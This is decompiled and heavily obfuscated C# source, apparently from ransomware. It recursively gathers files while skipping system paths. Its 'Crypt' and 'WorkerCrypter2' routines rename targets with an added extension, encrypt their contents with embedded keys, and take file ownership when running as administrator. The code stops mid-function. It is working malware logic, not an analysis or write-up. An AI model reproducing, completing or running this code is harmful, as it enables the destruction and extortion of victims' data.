using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using leLftCXICzmTes;

namespace uBrdXrCSgnwM;

internal sealed class fQUgTOUpJumL
{
	public sealed class YhjuApFlyy
	{
		private static StringCollection FQvjqwRntWJOAnBS;

		private static List<string> DwpxzasJgb;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107412190));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains(getString_0(107412185)) && !text.ToLower().Contains(getString_0(107412132)) && !text.ToLower().Contains(getString_0(107388844)) && !text.ToLower().Contains(getString_0(107388863)) && !text.ToLower().Contains(getString_0(107412151)) && !text.ToLower().Contains(getString_0(107388171)) && !text.ToLower().Contains(getString_0(107388071)) && !text.ToLower().Contains(getString_0(107388086)) && !text.ToLower().Contains(getString_0(107388037)) && !text.ToLower().Contains(getString_0(107388052)) && !text.ToLower().Contains(getString_0(107388530)) && !text.ToLower().Contains(getString_0(107388513)) && !text.ToLower().Contains(getString_0(107388464)) && !text.ToLower().Contains(getString_0(107388451)) && !text.ToLower().Contains(getString_0(107388430)) && !text.ToLower().Contains(getString_0(107388449)) && !text.ToLower().Contains(getString_0(107388436)) && !text.ToLower().Contains(getString_0(107388387)) && !text.ToLower().Contains(getString_0(107388402)) && !text.Contains(khBNqVxVYaM(getString_0(107388385))) && !text.Contains(getString_0(107388328)) && !text.Contains(getString_0(107388347)) && !text.Contains(getString_0(107388302)) && !text.EndsWith(getString_0(107395542)) && !text.EndsWith(getString_0(107388309)) && !text.EndsWith(getString_0(107387760)) && !text.EndsWith(getString_0(107387755)) && !text.EndsWith(getString_0(107387750)) && !text.ToLower().Contains(getString_0(107387777)) && !text.ToLower().Contains(rwyuADDQdblNA)) || text.Contains(khBNqVxVYaM(getString_0(107388112))))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(rqLFEsCDTMyF) * 1024.0 * 1024.0 && oLUeHhoXSrXL == getString_0(107396869))
							{
								DwpxzasJgb.Add(text);
							}
							else if (File.Exists(text) && oLUeHhoXSrXL == getString_0(107396307))
							{
								DwpxzasJgb.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return DwpxzasJgb;
		}

		static YhjuApFlyy()
		{
			Strings.CreateGetStringDelegate(typeof(YhjuApFlyy));
			FQvjqwRntWJOAnBS = new StringCollection();
			DwpxzasJgb = new List<string>();
		}
	}

	private sealed class TubnkBsxwwr
	{
		public string IpRGqFaYhWFXiZxQ;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == IpRGqFaYhWFXiZxQ;
		}
	}

	private sealed class azsGgSfLyvmkzG
	{
		public string bkYXYKOePlV;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__1f(int int_0)
		{
			Thread.Sleep(bcPffxszCs);
			qyAhWYLrtiOtS.Add(getString_0(107387710) + bkYXYKOePlV + getString_0(107396794) + (char)int_0 + getString_0(107412105));
			try
			{
				if (qqVKUcwYqRObMU)
				{
					Console.WriteLine(getString_0(107387710) + bkYXYKOePlV + getString_0(107396794) + (char)int_0 + getString_0(107412105));
				}
			}
			catch
			{
			}
		}

		static azsGgSfLyvmkzG()
		{
			Strings.CreateGetStringDelegate(typeof(azsGgSfLyvmkzG));
		}
	}

	private sealed class kTXTIWfGzHEwJ
	{
		private sealed class FkFVdMXbWymVrx
		{
			public kTXTIWfGzHEwJ bwwPlADRDoUmZRx;

			public string bxBPkBiQPHtaoYm;

			public void _003CCrypt_003Eb__2c()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					zZreWIIwDWlLBwg(WindowsIdentity.GetCurrent().Name, bxBPkBiQPHtaoYm);
				}
			}

			public void _003CCrypt_003Eb__2d()
			{
				JeFURtIEpxub(bxBPkBiQPHtaoYm, bwwPlADRDoUmZRx.mJAooCuEQeBfV, bwwPlADRDoUmZRx.WHtCQmtmCerFiI, bwwPlADRDoUmZRx.tcuSYIIomKFQ, bwwPlADRDoUmZRx.weaWcqsUGynTpn);
			}
		}

		public string[] mJAooCuEQeBfV;

		public string[] tcuSYIIomKFQ;

		public string weaWcqsUGynTpn;

		public string WHtCQmtmCerFiI;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__2b(string string_0)
		{
			FkFVdMXbWymVrx CS_0024_003C_003E8__locals0 = new FkFVdMXbWymVrx();
			CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx = this;
			CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm = string_0;
			if (WRwAKzNShnoL && !pIFGXSXFivCGoDR().Contains(getString_0(107388615)) && !pIFGXSXFivCGoDR().Contains(getString_0(107412137)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zZreWIIwDWlLBwg(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (mWfsjXfVaDjgsa == getString_0(107396877))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					JeFURtIEpxub(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.mJAooCuEQeBfV, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.WHtCQmtmCerFiI, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.tcuSYIIomKFQ, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.weaWcqsUGynTpn);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				JeFURtIEpxub(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, mJAooCuEQeBfV, WHtCQmtmCerFiI, tcuSYIIomKFQ, weaWcqsUGynTpn);
			}
		}

		static kTXTIWfGzHEwJ()
		{
			Strings.CreateGetStringDelegate(typeof(kTXTIWfGzHEwJ));
		}
	}

	private sealed class HbGtZiKmUw
	{
		private sealed class QScawntZyyJuoh
		{
			public HbGtZiKmUw tkdfLXnvtaLVtT;

			public string gJazcLYPjvD;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__39()
			{
				foreach (string item in hHDzREQRrQkqjKe)
				{
					if (gJazcLYPjvD.ToLower().EndsWith(item + tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == getString_0(107396888))
					{
						if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(gJazcLYPjvD).Length)
						{
							try
							{
								YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389225), getString_0(107389188), getString_0(107389175), gJazcLYPjvD);
							}
							catch
							{
							}
						}
					}
					else if (gJazcLYPjvD.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396326))
					{
						try
						{
							YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389225), getString_0(107389188), getString_0(107389175), gJazcLYPjvD);
						}
						catch
						{
						}
					}
				}
			}

			static QScawntZyyJuoh()
			{
				Strings.CreateGetStringDelegate(typeof(QScawntZyyJuoh));
			}
		}

		private sealed class vljTfCIVJtKHSZF
		{
			public HbGtZiKmUw tkdfLXnvtaLVtT;

			public string ksJAkzHcZyIN;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__3b()
			{
				foreach (string item in hHDzREQRrQkqjKe)
				{
					if (ksJAkzHcZyIN.ToLower().EndsWith(item + tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == getString_0(107396891))
					{
						if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(ksJAkzHcZyIN).Length)
						{
							try
							{
								YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389228), getString_0(107389191), getString_0(107389178), ksJAkzHcZyIN);
							}
							catch
							{
							}
						}
					}
					else if (ksJAkzHcZyIN.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396329))
					{
						try
						{
							YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389228), getString_0(107389191), getString_0(107389178), ksJAkzHcZyIN);
						}
						catch
						{
						}
					}
				}
			}

			static vljTfCIVJtKHSZF()
			{
				Strings.CreateGetStringDelegate(typeof(vljTfCIVJtKHSZF));
			}
		}

		public List<string> JQuaujjSravKN;

		public List<string> XZRDbtNRlUBUa;

		public string UfgTUBLEANxCD;

		public string[] JzXWXIIovwkoW;

		public string kEFVKbULbQeU;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__38(string string_0)
		{
			QScawntZyyJuoh CS_0024_003C_003E8__locals0;
			foreach (string item in XZRDbtNRlUBUa)
			{
				if (JzXWXIIovwkoW.Length != 0)
				{
					string[] jzXWXIIovwkoW = JzXWXIIovwkoW;
					int num = 0;
					while (num < jzXWXIIovwkoW.Length)
					{
						string value = jzXWXIIovwkoW[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0a3a;
					}
				}
				try
				{
					if (item.EndsWith(UfgTUBLEANxCD))
					{
						goto IL_0a3a;
					}
				}
				catch (Exception)
				{
					goto IL_0a3a;
				}
				if (!item.EndsWith(string_0) || lBBLtRfPsPV.Contains(item))
				{
					continue;
				}
				if (mdbUrlsnzSwt == getString_0(107396885))
				{
					try
					{
						if (HTdRYTdIWx.JWkurGLhKeTLl(item))
						{
							HTdRYTdIWx.FhwYvNuKmRb(item);
						}
					}
					catch
					{
					}
				}
				lBBLtRfPsPV.Add(item);
				if (!rEUVMKgscr.Contains(Path.GetDirectoryName(item)))
				{
					rEUVMKgscr.Add(Path.GetDirectoryName(item));
				}
				ZJtjVIJZvG(item);
				try
				{
					new RhisUuNeBnW().SnwNkYfRWeFlkSm(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qqVKUcwYqRObMU)
							{
								Console.WriteLine(getString_0(107412132) + item + getString_0(107412567) + new FileInfo(item).Length + getString_0(107412578));
								Console.WriteLine(getString_0(107412537));
							}
						}
						catch
						{
						}
						hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107412464)), getString_0(107387677) + item + getString_0(107387677) + khBNqVxVYaM(getString_0(107412407)) + getString_0(107387677) + Environment.UserName + getString_0(107387677) + khBNqVxVYaM(getString_0(107412422)));
					}
				}
				catch (Exception ex2)
				{
					if (hIFJbdEMJudY)
					{
						try
						{
							File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + item + getString_0(107412397) + ex2.Message + getString_0(107395833));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (hIFJbdEMJudY)
						{
							try
							{
								File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + item + getString_0(107411772) + ex2.Message + getString_0(107395833));
							}
							catch (Exception)
							{
							}
						}
						gmdqiJfLiKSG++;
						goto end_IL_02ef;
					}
					byte[] bytes;
					if (ZTtOBFIFhDPJ == getString_0(107396885) && new FileInfo(item).Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024 && !JQuaujjSravKN.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new QScawntZyyJuoh();
						CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = this;
						try
						{
							if (UfgTUBLEANxCD != getString_0(107386064))
							{
								if (eSjMTjCatON)
								{
									UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
								}
								File.Move(item, item + UfgTUBLEANxCD);
							}
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + item + getString_0(107411711) + ex2.Message + getString_0(107395833));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							goto end_IL_02ef;
						}
						CS_0024_003C_003E8__locals0.gJazcLYPjvD = getString_0(107389109);
						if (UfgTUBLEANxCD != getString_0(107386064))
						{
							CS_0024_003C_003E8__locals0.gJazcLYPjvD = item + UfgTUBLEANxCD;
						}
						else
						{
							CS_0024_003C_003E8__locals0.gJazcLYPjvD = item;
						}
						if (CMdYdSoRLCrMajhb == getString_0(107396885))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in hHDzREQRrQkqjKe)
								{
									if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == QScawntZyyJuoh.getString_0(107396888))
									{
										if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gJazcLYPjvD).Length)
										{
											try
											{
												YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(QScawntZyyJuoh.getString_0(107389225), QScawntZyyJuoh.getString_0(107389188), QScawntZyyJuoh.getString_0(107389175), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item2) && TQwKQbvIHjGUX == QScawntZyyJuoh.getString_0(107396326))
									{
										try
										{
											YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(QScawntZyyJuoh.getString_0(107389225), QScawntZyyJuoh.getString_0(107389188), QScawntZyyJuoh.getString_0(107389175), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
						if (iHEcKVZxNihtAo == getString_0(107396323))
						{
							byte[] array = null;
							byte[] byte_ = jhwgYCEJrwAyHhOqV.rylMDCeIQdlN(CS_0024_003C_003E8__locals0.gJazcLYPjvD, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
							if (jhwgYCEJrwAyHhOqV.POBdXBMelNFVnn(aDuOpKdbopnXZSS: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? yJUJkIUuqJMKqH.NzBtYERGLLff(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : yJUJkIUuqJMKqH.NzBtYERGLLff(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), tCxABdmTRJNTj: CS_0024_003C_003E8__locals0.gJazcLYPjvD, jVlQEpTxuNU: bytes))
							{
								goto IL_0a3a;
							}
							try
							{
								File.Move(item + UfgTUBLEANxCD, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!MFCrMNyVwftIF)
						{
							if (XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
							{
								goto IL_0a3a;
							}
							try
							{
								File.Move(item + UfgTUBLEANxCD, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, kEFVKbULbQeU, bytes, Convert.FromBase64String(HZePHYGbpexu)))
							{
								goto IL_0a3a;
							}
							try
							{
								File.Move(item + UfgTUBLEANxCD, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (eSjMTjCatON)
					{
						UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
					}
					bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
					if (UfgTUBLEANxCD != getString_0(107386064))
					{
						if (!wRVzxmISkhBzKR)
						{
							if (!MFCrMNyVwftIF)
							{
								nQqNAlsrsLR(item, item + UfgTUBLEANxCD, cjnjoiIOwY);
							}
							else
							{
								nQqNAlsrsLR(item, item + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU));
							}
						}
						else
						{
							try
							{
								if (!MFCrMNyVwftIF)
								{
									jDHUSaghZQjW(item, item + UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
								}
								else
								{
									jDHUSaghZQjW(item, item + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
								}
							}
							catch (Exception ex2)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + item + getString_0(107386050) + ex2.Message + getString_0(107395833));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								try
								{
									File.Move(item + UfgTUBLEANxCD, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02ef;
							}
						}
					}
					else if (!wRVzxmISkhBzKR)
					{
						if (!MFCrMNyVwftIF)
						{
							nQqNAlsrsLR(item, item + getString_0(107386059), cjnjoiIOwY);
						}
						else
						{
							nQqNAlsrsLR(item, item + getString_0(107386059), Convert.FromBase64String(kEFVKbULbQeU));
						}
					}
					else
					{
						try
						{
							if (!MFCrMNyVwftIF)
							{
								jDHUSaghZQjW(item, item, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
							}
							else
							{
								jDHUSaghZQjW(item, item, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
							}
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + item + getString_0(107386050) + ex2.Message + getString_0(107395833));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							goto end_IL_02ef;
						}
					}
					if (MFCrMNyVwftIF)
					{
						if (UfgTUBLEANxCD != getString_0(107386064))
						{
							kwCznOOXZRpq(item + UfgTUBLEANxCD, bytes);
						}
						else
						{
							kwCznOOXZRpq(item, bytes);
						}
					}
					goto IL_0a3a;
					end_IL_02ef:;
				}
				catch (Exception)
				{
					goto IL_0a3a;
				}
				continue;
				IL_0a3a:
				XZRDbtNRlUBUa.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__3a(string string_0)
		{
			vljTfCIVJtKHSZF CS_0024_003C_003E8__locals0 = new vljTfCIVJtKHSZF();
			CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = this;
			CS_0024_003C_003E8__locals0.ksJAkzHcZyIN = string_0;
			if (JzXWXIIovwkoW.Length != 0)
			{
				string[] jzXWXIIovwkoW = JzXWXIIovwkoW;
				int num = 0;
				while (num < jzXWXIIovwkoW.Length)
				{
					string value = jzXWXIIovwkoW[num];
					if (!CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ae4;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(UfgTUBLEANxCD))
				{
					goto IL_0ae4;
				}
			}
			catch (Exception)
			{
				goto IL_0ae4;
			}
			if (!lBBLtRfPsPV.Contains(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
			{
				if (mdbUrlsnzSwt == getString_0(107396885))
				{
					try
					{
						if (HTdRYTdIWx.JWkurGLhKeTLl(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
						{
							HTdRYTdIWx.FhwYvNuKmRb(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
						}
					}
					catch
					{
					}
				}
				lBBLtRfPsPV.Add(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
				if (!rEUVMKgscr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN)))
				{
					rEUVMKgscr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN));
				}
				ZJtjVIJZvG(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
				try
				{
					new RhisUuNeBnW().SnwNkYfRWeFlkSm(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qqVKUcwYqRObMU)
							{
								Console.WriteLine(getString_0(107412132) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107412567) + new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length + getString_0(107412578));
								Console.WriteLine(getString_0(107412537));
							}
						}
						catch
						{
						}
						hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107412464)), getString_0(107387677) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107387677) + khBNqVxVYaM(getString_0(107412407)) + getString_0(107387677) + Environment.UserName + getString_0(107387677) + khBNqVxVYaM(getString_0(107412422)));
					}
				}
				catch (Exception ex2)
				{
					if (hIFJbdEMJudY)
					{
						try
						{
							File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107412397) + ex2.Message + getString_0(107395833));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length != 0L)
						{
							goto end_IL_032e;
						}
						goto end_IL_032d;
						end_IL_032e:;
					}
					catch (Exception ex2)
					{
						if (hIFJbdEMJudY)
						{
							try
							{
								File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107411772) + ex2.Message + getString_0(107395833));
							}
							catch (Exception)
							{
							}
						}
						gmdqiJfLiKSG++;
						goto end_IL_032d;
					}
					if (ZTtOBFIFhDPJ == getString_0(107396885) && new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024)
					{
						try
						{
							if (UfgTUBLEANxCD != getString_0(107386064))
							{
								if (eSjMTjCatON)
								{
									UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
								}
								File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD);
							}
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107411711) + ex2.Message + getString_0(107395833));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							return;
						}
						if (UfgTUBLEANxCD != getString_0(107386064))
						{
							CS_0024_003C_003E8__locals0.ksJAkzHcZyIN += UfgTUBLEANxCD;
						}
						if (CMdYdSoRLCrMajhb == getString_0(107396885))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in hHDzREQRrQkqjKe)
								{
									if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == vljTfCIVJtKHSZF.getString_0(107396891))
									{
										if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length)
										{
											try
											{
												YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(vljTfCIVJtKHSZF.getString_0(107389228), vljTfCIVJtKHSZF.getString_0(107389191), vljTfCIVJtKHSZF.getString_0(107389178), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item) && TQwKQbvIHjGUX == vljTfCIVJtKHSZF.getString_0(107396329))
									{
										try
										{
											YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(vljTfCIVJtKHSZF.getString_0(107389228), vljTfCIVJtKHSZF.getString_0(107389191), vljTfCIVJtKHSZF.getString_0(107389178), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
						if (iHEcKVZxNihtAo == getString_0(107396323))
						{
							byte[] array = null;
							byte[] byte_ = jhwgYCEJrwAyHhOqV.rylMDCeIQdlN(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
							if (!jhwgYCEJrwAyHhOqV.POBdXBMelNFVnn(aDuOpKdbopnXZSS: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? yJUJkIUuqJMKqH.NzBtYERGLLff(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : yJUJkIUuqJMKqH.NzBtYERGLLff(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), tCxABdmTRJNTj: CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, jVlQEpTxuNU: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!MFCrMNyVwftIF)
						{
							if (!XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, kEFVKbULbQeU, bytes, Convert.FromBase64String(HZePHYGbpexu)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (eSjMTjCatON)
						{
							UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
						}
						byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
						if (UfgTUBLEANxCD != getString_0(107386064))
						{
							if (!wRVzxmISkhBzKR)
							{
								if (!MFCrMNyVwftIF)
								{
									nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, cjnjoiIOwY);
								}
								else
								{
									nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU));
								}
							}
							else
							{
								try
								{
									if (!MFCrMNyVwftIF)
									{
										jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
									}
									else
									{
